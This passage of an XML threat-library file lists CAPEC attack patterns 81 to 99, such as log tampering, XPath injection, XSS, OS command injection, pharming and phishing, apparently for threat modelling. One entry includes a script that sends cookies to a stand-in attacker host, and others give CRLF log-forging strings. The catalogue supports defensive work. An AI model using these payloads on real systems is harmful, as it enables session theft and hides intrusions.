manipulation, remote code execution, etc.</description>
</threat>
<threat label="CAPEC-81" name="Web Logs Tampering" type="Standard" reference="CAPEC">
  <description>Web Logs Tampering attacks involve an attacker injecting, deleting or otherwise tampering with the contents of web logs typically for the purposes of masking other malicious behavior. Additionally, writing malicious data to log files may target jobs, filters, reports, and other agents that process the logs in an asynchronous attack pattern. This pattern of attack is similar to &quot;Log Injection-Tampering-Forging&quot; except that in this case, the attack is targeting the logs of the web server and not the application.The attacker observes the system and looks for indicators of which logging utility is being used by the web server.Determine logging utility being used by application web server (e.g. log4j), only possible if the application is known by the attacker or if the application returns error messages with logging utility information.The attacker launches various logged actions with malicious data to determine what sort of log injection is possible.Attacker triggers logged actions with maliciously crafted data as inputs, parameters, arguments, etc.The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted request that the web server will receive and write into the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.Indirectly through injection, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry.For example: The HTTP request for &quot;/index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] &quot;GET /forged-path HTTP/1.1&quot; 200 - &quot;-&quot; USER_AGENT&quot; may add the log line into Apache &quot;access_log&quot; (for example). Different applications may require different encodings of the carriage return and line feed characters.Directly through log file or database manipulation, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry.For example: The HTTP request for &quot;/index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] &quot;GET /forged-path HTTP/1.1&quot; 200 - &quot;-&quot; USER_AGENT&quot; may add the log line into Apache &quot;access_log&quot; (for example). Different applications may require different encodings of the carriage return and line feed characters.Directly through log file or database manipulation, modify existing log entries.Log data contains data designed to trick administrators and auditors as to chain of events. Limit ability to conduct forensics and other investigations/responses.</description>
</threat>
<threat label="CAPEC-82" name="Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))" type="Standard" reference="CAPEC">
  <description>XML Denial of Service (XDoS) can be applied to any technology that utilizes XML data. This is, of course, most distributed systems technology including Java, .Net, databases, and so on. XDoS is most closely associated with web services, SOAP, and Rest, because remote service requesters can post malicious XML payloads to the service provider designed to exhaust the service provider's memory, CPU, and/or disk space. The main weakness in XDoS is that the service provider generally must inspect, parse, and validate the XML messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that XDoS targets.There are three primary attack vectors that XDoS can navigateTarget CPU through recursion: attacker creates a recursive payload and sends to service providerTarget memory through jumbo payloads: service provider uses DOM to parse XML. DOM creates in memory representation of XML document, but when document is very large (for example, north of 1 Gb) service provider host may exhaust memory trying to build memory objects.XML Ping of death: attack service provider with numerous small files that clog the system.All of the above attacks exploit the loosely coupled nature of web services, where the service provider has little to no control over the service requester and any messages the service requester sends.Denial of Service</description>
</threat>
<threat label="CAPEC-83" name="XPath Injection" type="Detailed" reference="CAPEC">
  <description>An attacker can craft special user-controllable input consisting of XPath expressions to inject the XML database and bypass authentication or glean information that he normally would not be able to. XPath Injection enables an attacker to talk directly to the XML database, thus bypassing the application completely. XPath Injection results form the failure of an application to properly sanitize input used as part of dynamic XPath expressions used to query an XML database. In order to successfully inject XML and retrieve information from a database, an attacker:Determines the user-controllable input that is used without proper validation as part of XPath queriesDetermines the structure of queries that accept such inputCrafts malicious content containing XPath expressions that is not validated by the application and is executed as part of the XPath queries.The attacker tries to inject characters that can cause an XPath error, such as single-quote ('), or content that may cause a malformed XPath expression. If the injection of such content into the input causes an XPath error and the resulting error is displayed unfiltered, the attacker can begin to determine the nature of input validation and structure of XPath expressions used in queries.Too many exceptions generated by the appplication as a result of malformed XPath queriesThe impact of payload activation is that it is interpreted as part of the XPath expression used in the query, thus enabling an attacker to modify the expression used by the query.</description>
</threat>
<threat label="CAPEC-84" name="XQuery Injection" type="Detailed" reference="CAPEC">
  <description>This attack utilizes XQuery to probe and attack server systems; in a similar manner that SQL Injection allows an attacker to exploit SQL calls to RDBMS, XQuery Injection uses improperly validated data that is passed to XQuery commands to traverse and execute commands that the XQuery routines have access to. XQuery injection can be used to enumerate elements on the victim's environment, inject commands to the local host, or execute queries to remote files and data sources.Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.Inputs are used by the application or the browser (DOM)Using URL rewriting, parameters may be part of the URL path.No parameters appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to XQL injection, attempt to inject characters that have special meaning in XQL. The goal is to create an XQL query with an invalid syntax.Use web browser to inject input through text fields or through HTTP GET parameters.Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.Use XML files to inject input.Use network-level packet injection tools such as netcat to inject inputUse modified client (modified by reverse engineering) to inject input.Attacker receives normal response from server.Attacker receives an error message from server indicating that there was a problem with the XQL query.Server sends a specific error message that indicates programmatic parsing of the input data (e.g. NumberFormatException)The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to inappropriate disclosure of information.Leveraging one of the vulnerable inputs identified during the Experiment phase, inject malicious XQuery payload. The payload aims to get information on the structure of the underlying XML database and/or the content in it.The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to modification of application data.Leveraging one of the vulnerable inputs identified during the Experiment phase, inject malicious XQuery payload.. The payload tries to insert or replace data in the XML database.</description>
</threat>
<threat label="CAPEC-85" name="Client Network Footprinting (using AJAX/XSS)" type="Detailed" reference="CAPEC">
  <description>This attack utilizes the frequent client-server roundtrips in Ajax conversation to scan a system. While Ajax does not open up new vulnerabilities per se, it does optimize them from an attacker point of view. In many XSS attacks the attacker must get a &quot;hole in one&quot; and successfully exploit the vulnerability on the victim side the first time, once the client is redirected the attacker has many chances to engage in follow on probes, but their is only one first chance. In a widely used web application this is not a major problem because 1 in a 1,000 is good enough in a widely used application.A common first step for an attacker is to footprint the environment to understand what attacks will work. Since footprinting relies on enumeration, the conversational pattern of rapid, multiple requests and responses that are typical in Ajax applications enable an attacker to look for many vulnerabilities, well known ports, network locations and so on.Enables attacker to execute probes against client system.</description>
</threat>
<threat label="CAPEC-86" name="Embedding Script (XSS ) in HTTP Headers" type="Detailed" reference="CAPEC">
  <description>An attack of this type exploits web applications that generate web content, such as links in a HTML page, based on unvalidated or improperly validated data submitted by other actors. XSS in HTTP Headers attacks target the HTTP headers which are hidden from most users and may not be validated by web applications.Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the entry points (input) that becomes part of generated HTTP header (not only GET/POST/COOKIE, but also Content-Type, etc.)Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters used in the HTTP headers.Look for HTML meta tags that could be injectableUse a proxy tool to record all links visited during a manual traversal of the web application.Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.Web content is generated by the application and served to the browser based on user-controllable inputs.HTTP header variables are used by the application or the browser (DOM)No HTTP variables appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.The attacker uses the entry points gathered in the &quot;Explore&quot; phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. He records all the responses from the server that include unmodified versions of his script.The attacker tries also to inject extra-parameter to the HTTP request to see if they are reflected back in the web page or in the HTTP response.Manually inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.Use a proxy tool to record results of manual input of XSS probes in known URLs.User-controllable input is embedded as part of generated HTTP headersInput parameters become part of the web page (even in meta tags)Output to the browser is not encoded to remove executable scripting syntax.Nothing is returned to the web page. It may be a stored XSS. The unique identifier from the probe helps to trace the flow of the possible XSS.As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web siteDevelop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).By manipulating the content, the attacker targets the information that the user would like to get from the website.Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.Enables attacker to execute scripts to launch attacks on server as well as remote client machine and environment</description>
</threat>
<threat label="CAPEC-87" name="Forceful Browsing" type="Standard" reference="CAPEC">
  <description>An attacker employs forceful browsing to access portions of a website that are otherwise unreachable through direct URL entry.Usually, a front controller or similar design pattern is employed to protect access to portions of a web application.Forceful browsing enables an attacker to access information, perform privileged operations and otherwise reach sections of the web appplication that have been improperly protected.Using an automated tool, an attacker follows all public links on a web site. He records all the links he finds.Use a spidering tool to follow and record all linksUse a proxy tool to record all links visited during a manual traversal of the web application.Using an automated tool, an attacker requests a variety of well-known URLs that correspond to administrative, debugging, or other useful internal actions. He records all the positive responses from the server.Use a spidering tool to follow and record attempts on well known URLsUse a proxy tool to record all links visited during a manual traversal of attempts on well known URLs.Common resource identifiers are used (e.g., /admin/, admin.jsp, admin.aspx, etc.)Well known middleware or application platforms are used (e.g., Cold Fusion, WebSphere, WebLogic, JBoss, etc.)By visiting the unprotected resource, the attacker makes use of unauthorized functionality.Access unprotected functions and execute them.The attacker discovers and views unprotected sensitive data.Direct request of protected pages that directly access database back-ends. (e.g., list.jsp, accounts.jsp, status.jsp, etc.)Dynamic pages (JSP, ASP, PHP, etc.) exist that divulge sensitive data without first checking authorization.Following all the links recursively reveals resources that are availableHaving a directory listing also points to the available pages and resources in the application that may be forcibly browsable.</description>
</threat>
<threat label="CAPEC-88" name="OS Command Injection" type="Standard" reference="CAPEC">
  <description>An attacker can leverage OS command injection in an application to elevate privileges, execute arbitrary commands and compromise the underlying operating system.The attacker determines user controllable input that gets passed as part of a command to the underlying operating system.Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, he attempts to guess the actual operating system.Induce errors to find informative error messagesThe target software accepts connections via the network.The attacker surveys the target application, possibly as a valid and authenticated userSpidering web sites for all available linksInventory all application inputsAttacker develops a list of valid inputsDepending on whether the application being exploited is a remote or local one the attacker crafts the appropriate malicious input, containing OS commands, to be passed to the applicationInject command delimiters using network packet injection tools (netcat, nemesis, etc.)Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.)Inventorying in prior step is successful.The attacker may steal information, install a back door access mechanism, elevate privileges or compromise the system in some other way.The attacker executes a command that stores sensitive information into a location where he can retrieve it later (perhaps using a different command injection).The attacker executes a command that stores sensitive information into a location where he can retrieve it later (perhaps using a different command injection).The attacker executes a command that stores sensitive information into a location where he can retrieve it later (perhaps using a different command injection).The injected OS commands are interpreted by the shell, causing them to be executed under the privileges of the process running the exploited application.</description>
</threat>
<threat label="CAPEC-89" name="Pharming" type="Standard" reference="CAPEC">
  <description>A pharming attack occurs when the victim is fooled into entering sensitive data into supposedly trusted locations, such as an online bank site or a trading platform. An attacker can impersonate these supposedly trusted sites and have the victim be directed to his site rather than the originally intended one.Pharming does not require script injection or clicking on malicious links for the attack to succeed.Attacker sets up a system mocking the one trusted by the users. This is usually a website that requires or handles sensitive information.The attacker then poisons the resolver for the targeted site. This is achieved by poisoning the DNS server, or the local hosts file, that directs the user to the original websiteWhen the victim requests the URL for the site, the poisoned records direct the victim to the attacker's system rather than the original one.Because of the identical nature of the original site and the attacker controlled one, and the fact that the URL is still the original one, the victim trusts the website reached and the attacker can now &quot;farm&quot; sensitive information such as credentials or account numbers.The attacker observes the targeted website for use of secure connection to exchange sensitive information. If it does not use secure connections, victim users cannot distinguish between the original and fake versions of the website.The attacker can also fingerprint the software running on the targeted system (DNS server, router or host) and look for vulnerabilities in order to poison the entries.</description>
</threat>
<threat label="CAPEC-9" name="Buffer Overflow in Local Command-Line Utilities" type="Detailed" reference="CAPEC">
  <description>This attack targets command-line utilities available in a number of shells. An attacker can leverage a vulnerability found in a command-line utility to escalate privilege to root.Attacker identifies command utilities exposed by the target host.On the probing stage, the attacker interacts with the command utility and observes the results of its input. The attacker's goal is to uncover a buffer oveflow in the command utility. For instance the attacker may find that input data are not properly validated.The attacker finds a buffer overflow vulnerability in the command utility and tries to exploit it. He crafts malicious code and injects it using the command utility. The attacker can at worst execute remote code on the target host.The attacker can probe for services available on the target host. Many services may expose a command utility. For instance Telnet is a service which can be invoked through a command shell.The most common is remote code execution.</description>
</threat>
<threat label="CAPEC-90" name="Reflection Attack in Authentication Protocol" type="Standard" reference="CAPEC">
  <description>An attacker can abuse an authentication protocol susceptible to reflection attack in order to defeat it. Doing so allows the attacker illegitimate access to the target system, without possessing the requisite credentials.Reflection attacks are of great concern to authentication protocols that rely on a challenge-handshake or similar mechanism. An attacker can impersonate a legitimate user and can gain illegitimate access to the system by successfully mounting a reflection attack during authentication.The attacker opens a connection to the target server and sends it a challengeThe server responds by returning the challenge encrypted with a shared secret as well as its own challenge to the attackerSince the attacker does not possess the shared secret, he initiates a second connection to the server and sends it, as challenge, the challenge received from the server on the first connectionThe server treats this as just another handshake and responds by encrypting the challenge and issuing its own to the attackerThe attacker now receives the encrypted challenge on the second connection and sends it as response to the server on the first connection, thereby successfully completing the handshake and authenticating to the server.</description>
</threat>
<threat label="CAPEC-91" name="XSS in IMG Tags" type="Detailed" reference="CAPEC">
  <description>Image tags are an often overlooked, but convenient, means for a Cross Site Scripting attack. The attacker can inject script contents into an image (IMG) tag in order to steal information from a victim's browser and execute malicious scripts.Using a browser , an attacker is looking at the application to figure out if it allows to specify images, upload them, etc.Use a browser to manually explore the website and identify entry points where the application allows the upload (or other means of specification) of images. Many browsers' plugins are available to facilitate the analysis or automate the discovery.The application has image upload functionality.The application allows users to point to or otherwise specify images.No parameters appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.The attacker uses the entry points gathered in the &quot;Explore&quot; phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed.Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed.Use a proxy tool to record results of the created requests.The output of pages includes image tags specified by users.Output to the browser is not encoded to remove executable scripting syntax.As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web siteDevelop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).By manipulating the content, the attacker targets the information that the user would like to get from the website.Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.Execution of the script in the victim's browser, contained in the image tag or from the location pointed to within the image tag.</description>
</threat>
<threat label="CAPEC-92" name="Forced Integer Overflow" type="Standard" reference="CAPEC">
  <description>This attack forces an integer variable to go out of range. The integer variable is often used as an offset such as size of memory allocation or similarly. The attacker would typically control the value of such variable and try to get it out of range. For instance the integer in question is incremented past the maximum possible value, it may wrap to become a very small, or negative number, therefore providing a very incorrect value which can lead to unexpected behavior. At worst the attacker can execute arbitrary code.The first step is exploratory meaning the attacker looks for an integer variable that he can control.The attacker finds an integer variable that he can write into or manipulate and try to get the value of the integer out of the possible range. The integer variable is forced to have a value out of range which set its final value to an unexpected value.The target host acts on the data and unexpected behaviour may happen.Vulnerability testing tool can be used to probe for integer overflow (e.g. fuzzer).The most common are issues of availability. In some situation, an integer oveflow can turn out to be an exploitable buffer overflow, then the attacker may be able to run arbitrary code on the target host.</description>
</threat>
<threat label="CAPEC-93" name="Log Injection-Tampering-Forging" type="Standard" reference="CAPEC">
  <description>This attack targets the log files of the target host. The attacker injects, manipulates or forges malicious log entries in the log file, allowing him to mislead a log audit, cover traces of attack, or perform other malicious actions. The target host is not properly controlling log access. As a result tainted data is resulting in the log files leading to a failure in accoutability, non-repudiation and incident forensics capability.The first step is exploratory meaning the attacker observes the system. The attacker looks for action and data that are likely to be logged. The attacker may be familiar with the log format of the system.Determine logging utility being used by application (e.g. log4j)Gain access to application's source code to determine log file formats.Install or obtain access to instance of application and observe its log file format.The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.Use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example: &quot;%0D%0A[Thu%20Nov%2012%2011:22]:Info:%20User%20admin%20logged%20in&quot; may add the following forged entry into a log file: &quot;[Thu Nov 12 12:11:22]:Info: User admin logged in&quot;. Different applications may require different encodings of the carriage return and line feed characters.Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain &lt;script&gt;new Image().src=&quot;http://xss.attacker.com/log_cookie?cookie=&quot;+encodeURI(document.cookie);&lt;/script&gt;. The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).The attacker will try to determine which data may be logged in case of a success or failure of a predetermined action such as authentication. Once that data has been identified, the attacker may try to craft malicious data to inject.Vulnerability testing tool can be used to test the input validation mechanism.Log tampering or forgery (misleading data)</description>
</threat>
<threat label="CAPEC-94" name="Man in the Middle Attack" type="Standard" reference="CAPEC">
  <description>This type of attack targets the communication between two components (typically client and server). The attacker places himself in the communication channel between the two components. Whenever one component attempts to communicate with the other (data flow, authentication challenges, etc.), the data first goes to the attacker, who has the opportunity to observe or alter it, and it is then passed on to the other component as if it was never intercepted. This interposition is transparent leaving the two compromised components unaware of the potential corruption or leakeage of their communications. The potential for Man-in-the-Middle attacks yields an implicit lack of trust in communication or identify between two components.The attacker probes to determine the nature and mechanism of communication between two components looking for opportunities to exploit.The attacker inserts himself into the communication channel initially acting as a routing proxy between the two targeted components. The attacker may or may not have to use cryptography.The attacker observes, filters or alters passed data of its choosing to gain access to sensitive information or to manipulate the actions of the two target components for his own purposes.The attacker can try to get the public-keys of the victims.There are free software tool to perform man in the middle attack (packet anlaysis, etc.)Privilege escalation. modification of resource, information leakage, etc.</description>
</threat>
<threat label="CAPEC-95" name="WSDL Scanning" type="Detailed" reference="CAPEC">
  <description>This attack targets the WSDL interface made available by a web service. The attacker may scan the WSDL interface to reveal sensitive information about invocation patterns, underlying technology implementations and associated vulnerabilities. This type of probing is carried out to perform more serious attacks (e.g. parameter tampering, malicious content injection, command injection, etc.). WSDL files provide detailed information about the services ports and bindings available to consumers. For instance, the attacker can submit special characters or malicious content to the Web service and can cause a denial of service condition or illegal access to database records. In addition, the attacker may try to guess other private methods by using the information provided in the WSDL files.The first step is exploratory meaning the attacker scans for WSDL documents. The WDSL document written in XML is like a handbook on how to communicate with the web services provided by the target host. It provides an open view of the application (function details, purpose, functional break down, entry points, message types, etc.). This is very useful information for the attacker.The second step that a attacker would undertake is to analyse the WSDL files and try to find potential weaknesses by sending messages matching the pattern described in the WSDL file. The attacker could run through all of the operations with different message request patterns until a breach is identified.Once an attacker finds a potential weakness, they can craft malicious content to be sent to the system. For instance the attacker may try to submit special characters and observe how the system reacts to an invalid request. The message sent by the attacker may not be XML validated and cause unexpected behavior.An attacker can request the WSDL file from the target host by sending a SOAP message.There are free Vulnerability testing tool, such as WSDigger to perform WSDL scanning - Foundstone's free Web services security tool performs WSDL scanning, SQL injection and XSS attacks on Web Services.</description>
</threat>
<threat label="CAPEC-96" name="Block Access to Libraries" type="Standard" reference="CAPEC">
  <description>An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. It is possible that the application does not handle situations properly where access to these libraries has been blocked. Depending on the error handling within the application, blocked access to libraries may leave the system in an insecure state that could be leveraged by an attacker.Determine what external libraries the application accesses.Block access to the external libraries accessed by the application.Monitor the behavior of the system to see if it goes into an insecure/inconsistent state.If the system does go into an insecure/inconsistent state, leverage that to obtain information about the system functionality or data, elevate access control, etc. The rest of this attack will depend on the context and the desired goal.</description>
</threat>
<threat label="CAPEC-97" name="Cryptanalysis" type="Standard" reference="CAPEC">
  <description>Cryptanalysis is a process of finding weaknesses in cryptographic algorithms and using these weaknesses to decipher the ciphertext without knowing the secret key (instance deduction). Sometimes the weakness is not in the cryptographic algorithm itself, but rather in how it is applied that makes cryptanalysis successful. An attacker may have other goals as well, such as:1. Total Break - Finding the secret key2. Gobal Deduction - Finding a functionally equivalent algorithm for encryption and decryption that does not require knowledge of the secret key.3. Information Deduction - Gaining some information about plaintexts or ciphertexts that was not previously known4. Distinguishing Algorithm - The attacker has the ability to distinguish the output of the encryption (ciphertext) from a random permutation of bitsThe goal of the attacker performing cryptanalysis will depend on the specific needs of the attacker in a given attack context. In most cases, if cryptanalysis is successful at all, an attacker will not be able to go past being able to deduce some information about the plaintext (goal 3). However, that may be sufficient for an attacker, depending on the context.An attacker discovers a weakness in the cryptographic algorithm or a weakness in how it was applied to a particular chunk of plaintext.An attacker leverages the discovered weakness to decrypt, partially decrypt or infer some information about the contents of the encrypted message. All of that is done without knowing the secret key.</description>
</threat>
<threat label="CAPEC-98" name="Phishing" type="Standard" reference="CAPEC">
  <description>Phishing is a social engineering technique where an attacker masquerades as a legitimate entity with which the victim might do business in order to prompt the user to reveal some confidential information (very frequently authentication credentials) that can later be used by an attacker. Phishing is essentially a form of information gathering or &quot;fishing&quot; for information.This optional step can be used to help the attacker impersonate the legitimate site more convincingly. The attacker can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L)Optionally obtain a legitimate SSL certificate for the new domain name.An attacker creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that he or she is trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.Use spidering software to get copy of web pages on legitimate site.Manually save copies of required web pages from legitimate site.Create new web pages that have the legitimate site's look at feel, but contain completely new content.An attacker sends an e-mail to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to attacker's website) and log in. The key is to get the victim to believe that the e-mail is coming from a legitimate entity with which the victim does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.Place phishing link in post to online forum.Once the attacker captures some sensitive information through phishing (login credentials, credit card information, etc.) the attacker can leverage this information. For instance, the attacker can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.Log in to the legitimate site using another user's supplied credentialsYou receive an e-mail from an entity that you are not even a customer of prompting you to log into your account.You receive any e-mail that provides you with a link which takes you to a website on which you need to enter your log in information.Making the link in the e-mail and the actual website look very legitimate.</description>
</threat>
<threat label="CAPEC-99" name="XML Parser Attack" type="Standard" reference="CAPEC">
  <description>Applications often need to transform data in and out of the XML format by using an XML parser. It may be possible for an attacker to inject data that may have an adverse effect on the XML parser when it is being processed. These adverse effects may include the parser crashing, consuming too much of a resource, executing too slowly, executing code supplied by an attacker, allowing usage of unintenteded system functionality, etc. An attacker's goal is to leverage parser failure to his or her advantage. In some cases it may be possible to jump from the data plane to the control plane via bad data being passed to an XML parser [1].An attacker determines the input data stream that is being processed by an XML parser on the server side.An attacker crafts input data that may have an adverse effect on the operation of the XML parser when the data is parsed on the server.Bad data is continuously passed to the XML parser, possibly making it crash.</description>
</threat>

</directory>
